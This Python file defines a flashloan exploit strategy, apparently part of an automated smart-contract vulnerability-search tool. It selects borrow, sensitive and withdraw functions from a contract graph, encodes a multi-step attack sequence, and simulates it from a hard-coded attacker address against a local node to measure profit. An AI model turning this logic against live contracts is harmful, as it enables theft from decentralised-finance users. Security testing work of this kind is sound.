import os
import asyncio
from web3 import Web3

class FlashloanStrategy:
    name = "flashloan"

    def __init__(self):
        self.w3 = Web3()

    async def run(self, context: dict, mcp) -> dict:
        srg = context.get("srg")
        srg_summary = context.get("srg_summary", {})
        top_contracts = srg_summary.get("top_contracts", [])
        rpc_url = os.environ.get("RPC_URL", "http://127.0.0.1:8545")
        attacker = "0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266"
        matched_skills = context.get("matched_skills", [])

        if not top_contracts:
            return {"strategy": self.name, "status": "no_exploit", "profit": 0, "confidence": 0.0}
        
        # 1. Check for matched skills first (LEARNING ENGINE)
        steps_to_run = []
        best_skill = None
        for skill in matched_skills:
            if skill.get("type") == self.name:
                best_skill = skill
                break
        
        if best_skill:
            print(f"[Attack] Using learned skill template: {best_skill.get('skill_id')}")
            steps_to_run = best_skill.get("steps", [])
        elif srg:
            # 2. SRG-DRIVEN ADVANCED ATTACK (Multi-step)
            print("[Attack] Analyzing SRG for multi-step flashloan pattern...")
            
            # Find a target contract from top_contracts
            contract_name = top_contracts[0].get("name", "")
            target_addr = f"0x{contract_name[:40].ljust(40, '0')}"
            
            # Find sensitive functions (writes + external calls)
            sensitive_funcs = srg.get_sensitive_functions()
            target_func = None
            for f in sensitive_funcs:
                if f.metadata.get("contract") == contract_name:
                    target_func = f
                    break
            
            # Find borrow/withdraw functions
            all_funcs = srg.get_functions(contract_name)
            borrow_func = next((f for f in all_funcs if "borrow" in f.name.lower() or "flash" in f.name.lower()), None)
            withdraw_func = next((f for f in all_funcs if "withdraw" in f.name.lower() or "claim" in f.name.lower() or "repay" in f.name.lower()), None)
            
            if borrow_func and target_func and withdraw_func:
                print(f"[Attack] Found multi-step targets: {borrow_func.name} -> {target_func.name} -> {withdraw_func.name}")
                
                # Encode calldata using signatures
                b_sig = srg.get_function_signature(borrow_func.id)
                t_sig = srg.get_function_signature(target_func.id)
                w_sig = srg.get_function_signature(withdraw_func.id)
                
                b_data = self.w3.keccak(text=b_sig).hex()[:10] + "0"*64 # Simple uint256 arg
                t_data = self.w3.keccak(text=t_sig).hex()[:10] + "0"*64 # Simple uint256 arg
                w_data = self.w3.keccak(text=w_sig).hex()[:10] + "0"*64 
                
                steps_to_run = [
                    {"target": target_addr, "data": b_data, "value": 0},
                    {"target": target_addr, "data": t_data, "value": 0},
                    {"target": target_addr, "data": w_data, "value": 0}
                ]
            else:
                # Fallback to single-step heuristic
                selector = "0x00000000"
                for f in all_funcs:
                    if any(kw in f.name.lower() for kw in ["borrow", "swap", "loan", "withdraw"]):
                        selector = self.w3.keccak(text=f"{f.name}(uint256)").hex()[:10]
                        break
                steps_to_run = [{"target": target_addr, "data": selector + "0" * 64, "value": 0}]
        else:
            # Minimal fallback
            contract_name = top_contracts[0].get("name", "")
            target = f"0x{contract_name[:40].ljust(40, '0')}"
            steps_to_run = [{"target": target, "data": "0x00000000" + "0"*64, "value": 0}]

        # 3. Get balance before
        res_before = await mcp.call("eth_get_balance", {"address": attacker})
        bal_before = res_before.get("result", {}).get("balance", 0)

        # 4. Simulate steps
        for step in steps_to_run:
            await mcp.call("simulate_tx", {
                "from": attacker,
                "to": step.get("target"),
                "data": step.get("data"),
                "value": step.get("value", 0)
            })
        
        # 5. Get balance after
        res_after = await mcp.call("eth_get_balance", {"address": attacker})
        bal_after = res_after.get("result", {}).get("balance", 0)
        
        profit = max(0, bal_after - bal_before)

        return {
            "strategy": self.name,
            "status": "success" if profit > 0 else "no_exploit",
            "profit": profit,
            "confidence": 0.9 if best_skill else (0.7 if len(steps_to_run) > 1 else 0.4),
            "steps": steps_to_run,
            "rpc_url": rpc_url,
            "skill_id": best_skill.get("skill_id") if best_skill else None
        }





